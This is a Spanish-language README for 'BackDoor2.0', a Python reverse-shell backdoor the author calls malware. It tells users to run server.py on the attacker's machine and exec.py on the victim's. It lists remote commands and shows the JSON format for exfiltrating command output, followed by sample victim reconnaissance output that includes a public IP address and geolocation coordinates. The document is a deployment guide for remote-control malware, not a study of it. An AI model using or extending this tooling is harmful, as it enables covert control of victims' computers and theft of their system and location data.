# BackDoor2.0
Esta es la version 2.0 de la anterior BackDoor base85, en esta nueva version estoy trabajando para poder anadir a la conexiones un cifrado AES. el malware todabia no se puede usar en modo trafico encriptado, pero si en trafico plano(sin encriptacion). <br>
la back door usa una conexion inversa,  siendo el script server.py el ejecutar en la maquina del atacante y el exec.py en la maquina objetivo. ambos reciben por parametro el puerto para establecer la conexion. <br>
Se a de configurar la direcion ip del archivo exec.py con su ip publica o direcion de tunel para la conexion. <br>
El malware transmite los datos en formato json ya que son mas faciles de tratar, siendo la estructura parecida a la siguiente:<br><br>
					self._Comando = {<br>
							"cursor" : self._Cursor,<br>
							"comando-data":getoutput(self._Comando),  <br>
							"tiempo actual" : self.Time,<br>
							"ruta actual" : self._cwd,<br>
					}<br>
<br>
donde self.Time equivale al tiempo en la maaquina victima, self._cwd el directorio actual, self._Cursor el Cursor o barra de estado y getoutput(self._Comando) la salida del comando ejecutado.<br>

la back door dispone de estos comando generales:  (proximamente mas...)<br>
-  cd                    comando para desplazase por carpetas haciendo usa de la funcion os.chdir()<br>
-  cwd                   extrae la ruta del directorio actual mediante la fun os.getcwd()<br>
-  systeminfo            extrae info del pc objetivo<br>
-  exit                  cierra las conexiones y finaliza el programa en la maquina victima y atacante<br>
-  BufferServer          muestra el buffer del servidos<br>
-  BufferServerChange    permite cambiar el buffer del server, pero no es necesario ya que el malware es capaz de calcular la cantidad necesaria en cada transmision<br>

systeminfo da al atacante la info baica de la maquina objetivo, ejemplo:<br>
[*] El sistema operativo victima es: Linux<br>
[*] Tiempo actual: 2021/3/21 20:57:47<br>
[*] Directorio: /home/desmon/Desktop/back door<br>
[*] Nombre del equipo: desmon/desmon<br>
[*] Ip publica de la maquina es: ['99.179.213.144', {'Latitud': '29.5040016174', 'Longitud': '-0.4200999963'}]<br>
[*] Buffer Cliente: 4096<br>
[*] Tipo de conexion: <socket.socket fd=10, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 40066), raddr=('127.0.0.1', 8003)><br>
[*] Ejecutable de pythhon con el que se ejecuta: ('64bit', 'ELF')<br>
[*] Estructura: x86_64<br>
[*] Sistema operativo: Linux-5.10.16-arch1-1-x86_64-with-glibc2.33<br>
[*] Nombre real del Procesador: <br>
[*] Info de la version python: ('default', 'Feb  6 2021 06:49:13')<br>
[*] Compilador de python: GCC 10.2.0<br>
[*] Implementacion de python: CPython<br>
[*] Version del sistema: 5.10.16-arch1-1<br>
[*] <br>
[*] uname_result(system='Linux', node='desmon', release='5.10.16-arch1-1', version='#1 SMP PREEMPT Sat, 13 Feb 2021 20:50:18 +0000', machine='x86_64')
<br>
